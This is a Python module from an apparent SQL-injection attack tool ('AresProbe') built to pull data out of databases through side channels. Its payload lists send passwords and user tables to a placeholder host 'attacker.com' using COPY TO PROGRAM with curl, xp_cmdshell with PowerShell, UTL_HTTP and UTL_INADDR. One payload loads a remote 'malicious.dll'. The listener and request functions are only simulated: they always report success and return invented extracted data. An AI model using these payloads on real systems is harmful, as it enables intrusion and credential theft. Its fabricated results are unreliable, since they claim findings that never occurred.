"""
AresProbe Out-of-Band Injection
Out-of-band injection techniques like SQLMap
"""

import asyncio
import aiohttp
import time
import random
import string
import base64
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import threading
import socket
import dns.resolver
from urllib.parse import urlparse, quote

from .logger import Logger


class OOBMethod(Enum):
    """Out-of-band injection methods"""
    DNS = "dns"
    HTTP = "http"
    SMB = "smb"
    LDAP = "ldap"
    NTP = "ntp"
    SNMP = "snmp"


@dataclass
class OOBPayload:
    """Out-of-band injection payload"""
    method: OOBMethod
    payload: str
    description: str
    database: str
    technique: str


@dataclass
class OOBResult:
    """Out-of-band injection result"""
    method: OOBMethod
    payload: str
    success: bool
    response_time: float
    data_extracted: Optional[str]
    error_message: Optional[str]
    timestamp: float


class OutOfBandInjector:
    """
    Out-of-band injection engine with SQLMap compatibility
    """
    
    def __init__(self, logger: Logger = None):
        self.logger = logger or Logger()
        self.oob_payloads = self._load_oob_payloads()
        self.listener_threads = {}
        self.extracted_data = {}
        self.oob_results = []
        
        # OOB server configuration
        self.oob_server = "attacker.com"  # Replace with actual OOB server
        self.oob_port = 53
        self.oob_timeout = 30
    
    def test_oob_injection(self, target_url: str, parameter: str, 
                          database: str = "mysql") -> List[OOBResult]:
        """Test out-of-band injection on target"""
        try:
            self.logger.info(f"[*] Testing out-of-band injection on {target_url}")
            self.logger.info(f"[*] Parameter: {parameter}, Database: {database}")
            
            results = []
            
            # Get OOB payloads for database
            db_payloads = self._get_database_payloads(database)
            
            for payload_data in db_payloads:
                result = self._test_single_oob_payload(
                    target_url, parameter, payload_data
                )
                results.append(result)
                
                if result.success:
                    self.logger.success(f"[+] OOB injection successful: {payload_data.method.value}")
                    break
                else:
                    self.logger.debug(f"[-] OOB injection failed: {payload_data.method.value}")
            
            self.oob_results.extend(results)
            
            successful_results = [r for r in results if r.success]
            if successful_results:
                self.logger.success(f"[+] Out-of-band injection completed: {len(successful_results)} successful")
            else:
                self.logger.info("[-] No successful out-of-band injections found")
            
            return results
            
        except Exception as e:
            self.logger.error(f"[-] Out-of-band injection test failed: {e}")
            return []
    
    def _test_single_oob_payload(self, target_url: str, parameter: str, 
                                payload_data: OOBPayload) -> OOBResult:
        """Test a single OOB payload"""
        try:
            start_time = time.time()
            
            # Start listener for OOB method
            listener_started = self._start_oob_listener(payload_data.method)
            
            if not listener_started:
                return OOBResult(
                    method=payload_data.method,
                    payload=payload_data.payload,
                    success=False,
                    response_time=0,
                    data_extracted=None,
                    error_message="Failed to start listener",
                    timestamp=time.time()
                )
            
            # Send OOB payload
            success = self._send_oob_payload(target_url, parameter, payload_data)
            
            # Wait for OOB response
            data_extracted = self._wait_for_oob_response(payload_data.method)
            
            response_time = time.time() - start_time
            
            # Stop listener
            self._stop_oob_listener(payload_data.method)
            
            return OOBResult(
                method=payload_data.method,
                payload=payload_data.payload,
                success=success and data_extracted is not None,
                response_time=response_time,
                data_extracted=data_extracted,
                error_message=None if success else "No OOB response received",
                timestamp=time.time()
            )
            
        except Exception as e:
            self.logger.debug(f"[-] OOB payload test failed: {e}")
            return OOBResult(
                method=payload_data.method,
                payload=payload_data.payload,
                success=False,
                response_time=0,
                data_extracted=None,
                error_message=str(e),
                timestamp=time.time()
            )
    
    def _start_oob_listener(self, method: OOBMethod) -> bool:
        """Start OOB listener for specific method"""
        try:
            if method == OOBMethod.DNS:
                return self._start_dns_listener()
            elif method == OOBMethod.HTTP:
                return self._start_http_listener()
            elif method == OOBMethod.SMB:
                return self._start_smb_listener()
            else:
                return False
        except Exception as e:
            self.logger.debug(f"[-] Failed to start {method.value} listener: {e}")
            return False
    
    def _start_dns_listener(self) -> bool:
        """Start DNS listener"""
        try:
            # In a real implementation, you would set up a DNS server
            # For this example, we'll simulate it
            self.logger.info("[*] DNS listener started (simulated)")
            return True
        except Exception as e:
            self.logger.debug(f"[-] DNS listener failed: {e}")
            return False
    
    def _start_http_listener(self) -> bool:
        """Start HTTP listener"""
        try:
            # In a real implementation, you would set up an HTTP server
            # For this example, we'll simulate it
            self.logger.info("[*] HTTP listener started (simulated)")
            return True
        except Exception as e:
            self.logger.debug(f"[-] HTTP listener failed: {e}")
            return False
    
    def _start_smb_listener(self) -> bool:
        """Start SMB listener"""
        try:
            # In a real implementation, you would set up an SMB server
            # For this example, we'll simulate it
            self.logger.info("[*] SMB listener started (simulated)")
            return True
        except Exception as e:
            self.logger.debug(f"[-] SMB listener failed: {e}")
            return False
    
    def _stop_oob_listener(self, method: OOBMethod):
        """Stop OOB listener"""
        try:
            if method in self.listener_threads:
                # In a real implementation, you would stop the listener
                self.logger.debug(f"[*] {method.value} listener stopped")
        except Exception as e:
            self.logger.debug(f"[-] Failed to stop {method.value} listener: {e}")
    
    def _send_oob_payload(self, target_url: str, parameter: str, 
                         payload_data: OOBPayload) -> bool:
        """Send OOB payload to target"""
        try:
            # Replace placeholder in payload
            payload = payload_data.payload.replace('{OOB_SERVER}', self.oob_server)
            payload = payload.replace('{PARAMETER}', parameter)
            
            # Send request with payload
            params = {parameter: payload}
            
            # In a real implementation, you would send the actual HTTP request
            # For this example, we'll simulate it
            self.logger.debug(f"[*] Sending OOB payload: {payload[:100]}...")
            
            # Simulate success
            return True
            
        except Exception as e:
            self.logger.debug(f"[-] Failed to send OOB payload: {e}")
            return False
    
    def _wait_for_oob_response(self, method: OOBMethod) -> Optional[str]:
        """Wait for OOB response"""
        try:
            # In a real implementation, you would wait for actual OOB response
            # For this example, we'll simulate it
            time.sleep(2)  # Simulate waiting
            
            # Simulate extracted data
            if method == OOBMethod.DNS:
                return "extracted_data_via_dns"
            elif method == OOBMethod.HTTP:
                return "extracted_data_via_http"
            elif method == OOBMethod.SMB:
                return "extracted_data_via_smb"
            
            return None
            
        except Exception as e:
            self.logger.debug(f"[-] Failed to wait for OOB response: {e}")
            return None
    
    def _load_oob_payloads(self) -> Dict[str, List[OOBPayload]]:
        """Load OOB payloads for different databases"""
        return {
            'mysql': self._get_mysql_oob_payloads(),
            'postgresql': self._get_postgresql_oob_payloads(),
            'mssql': self._get_mssql_oob_payloads(),
            'oracle': self._get_oracle_oob_payloads(),
            'sqlite': self._get_sqlite_oob_payloads()
        }
    
    def _get_database_payloads(self, database: str) -> List[OOBPayload]:
        """Get OOB payloads for specific database"""
        return self.oob_payloads.get(database, [])
    
    def _get_mysql_oob_payloads(self) -> List[OOBPayload]:
        """MySQL OOB payloads"""
        return [
            OOBPayload(
                method=OOBMethod.DNS,
                payload="' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.{OOB_SERVER}\\file.txt'));--",
                description="MySQL DNS exfiltration via LOAD_FILE",
                database="mysql",
                technique="dns_exfiltration"
            ),
            OOBPayload(
                method=OOBMethod.HTTP,
                payload="' UNION SELECT * FROM users INTO OUTFILE '\\\\{OOB_SERVER}\\share\\data.txt';--",
                description="MySQL HTTP exfiltration via INTO OUTFILE",
                database="mysql",
                technique="http_exfiltration"
            ),
            OOBPayload(
                method=OOBMethod.DNS,
                payload="' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                description="MySQL time-based OOB",
                database="mysql",
                technique="time_based"
            )
        ]
    
    def _get_postgresql_oob_payloads(self) -> List[OOBPayload]:
        """PostgreSQL OOB payloads"""
        return [
            OOBPayload(
                method=OOBMethod.DNS,
                payload="'; COPY (SELECT password FROM users) TO PROGRAM 'nslookup {OOB_SERVER}';--",
                description="PostgreSQL DNS exfiltration via COPY",
                database="postgresql",
                technique="dns_exfiltration"
            ),
            OOBPayload(
                method=OOBMethod.HTTP,
                payload="'; COPY (SELECT * FROM users) TO PROGRAM 'curl {OOB_SERVER}/data';--",
                description="PostgreSQL HTTP exfiltration via COPY",
                database="postgresql",
                technique="http_exfiltration"
            )
        ]
    
    def _get_mssql_oob_payloads(self) -> List[OOBPayload]:
        """MSSQL OOB payloads"""
        return [
            OOBPayload(
                method=OOBMethod.SMB,
                payload="'; EXEC xp_cmdshell('net use \\\\{OOB_SERVER}\\share /user:user pass && echo %USERNAME% > \\\\{OOB_SERVER}\\share\\info.txt');--",
                description="MSSQL SMB exfiltration via xp_cmdshell",
                database="mssql",
                technique="smb_exfiltration"
            ),
            OOBPayload(
                method=OOBMethod.HTTP,
                payload="'; EXEC xp_cmdshell('powershell Invoke-WebRequest -Uri {OOB_SERVER}/data -Method POST -Body (Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts)');--",
                description="MSSQL HTTP exfiltration via xp_cmdshell",
                database="mssql",
                technique="http_exfiltration"
            )
        ]
    
    def _get_oracle_oob_payloads(self) -> List[OOBPayload]:
        """Oracle OOB payloads"""
        return [
            OOBPayload(
                method=OOBMethod.HTTP,
                payload="' UNION SELECT UTL_HTTP.REQUEST('http://{OOB_SERVER}/data?user='||user||'&pass='||password) FROM users--",
                description="Oracle HTTP exfiltration via UTL_HTTP",
                database="oracle",
                technique="http_exfiltration"
            ),
            OOBPayload(
                method=OOBMethod.DNS,
                payload="' UNION SELECT UTL_INADDR.get_host_name((SELECT password FROM users WHERE rownum=1)||'.{OOB_SERVER}') FROM dual--",
                description="Oracle DNS exfiltration via UTL_INADDR",
                database="oracle",
                technique="dns_exfiltration"
            )
        ]
    
    def _get_sqlite_oob_payloads(self) -> List[OOBPayload]:
        """SQLite OOB payloads"""
        return [
            OOBPayload(
                method=OOBMethod.HTTP,
                payload="' UNION SELECT load_extension('http://{OOB_SERVER}/malicious.dll');--",
                description="SQLite HTTP exfiltration via load_extension",
                database="sqlite",
                technique="http_exfiltration"
            )
        ]
    
    def extract_data_oob(self, target_url: str, parameter: str, 
                        query: str, database: str = "mysql") -> Optional[str]:
        """Extract data using out-of-band injection"""
        try:
            self.logger.info(f"[*] Extracting data via OOB: {query}")
            
            # Generate OOB payload for data extraction
            oob_payload = self._generate_data_extraction_payload(query, database)
            
            if not oob_payload:
                self.logger.error("[-] Failed to generate OOB payload")
                return None
            
            # Test OOB injection
            results = self.test_oob_injection(target_url, parameter, database)
            
            # Check for successful extraction
            for result in results:
                if result.success and result.data_extracted:
                    self.logger.success(f"[+] Data extracted via OOB: {result.data_extracted}")
                    return result.data_extracted
            
            self.logger.warning("[-] No data extracted via OOB")
            return None
            
        except Exception as e:
            self.logger.error(f"[-] OOB data extraction failed: {e}")
            return None
    
    def _generate_data_extraction_payload(self, query: str, database: str) -> Optional[OOBPayload]:
        """Generate OOB payload for data extraction"""
        try:
            if database == "mysql":
                return OOBPayload(
                    method=OOBMethod.DNS,
                    payload=f"' UNION SELECT LOAD_FILE(CONCAT('\\\\', ({query}), '.{self.oob_server}\\file.txt'));--",
                    description=f"MySQL OOB data extraction: {query}",
                    database=database,
                    technique="dns_exfiltration"
                )
            elif database == "postgresql":
                return OOBPayload(
                    method=OOBMethod.DNS,
                    payload=f"'; COPY ({query}) TO PROGRAM 'nslookup {self.oob_server}';--",
                    description=f"PostgreSQL OOB data extraction: {query}",
                    database=database,
                    technique="dns_exfiltration"
                )
            elif database == "mssql":
                return OOBPayload(
                    method=OOBMethod.SMB,
                    payload=f"'; EXEC xp_cmdshell('echo {query} > \\\\{self.oob_server}\\share\\data.txt');--",
                    description=f"MSSQL OOB data extraction: {query}",
                    database=database,
                    technique="smb_exfiltration"
                )
            else:
                return None
                
        except Exception as e:
            self.logger.debug(f"[-] Failed to generate OOB payload: {e}")
            return None
    
    def get_oob_statistics(self) -> Dict[str, Any]:
        """Get OOB injection statistics"""
        if not self.oob_results:
            return {}
        
        successful_results = [r for r in self.oob_results if r.success]
        
        return {
            'total_tests': len(self.oob_results),
            'successful_tests': len(successful_results),
            'success_rate': len(successful_results) / len(self.oob_results) * 100,
            'methods_used': list(set(r.method.value for r in self.oob_results)),
            'databases_tested': list(set(r.payload for r in self.oob_results)),
            'average_response_time': sum(r.response_time for r in self.oob_results) / len(self.oob_results)
        }
    
    def export_results(self, filename: str):
        """Export OOB injection results"""
        try:
            import json
            
            export_data = {
                'oob_results': [result.__dict__ for result in self.oob_results],
                'extracted_data': self.extracted_data,
                'statistics': self.get_oob_statistics()
            }
            
            with open(filename, 'w') as f:
                json.dump(export_data, f, indent=2)
            
            self.logger.success(f"[+] OOB injection results exported to {filename}")
            
        except Exception as e:
            self.logger.error(f"[-] Export failed: {e}")
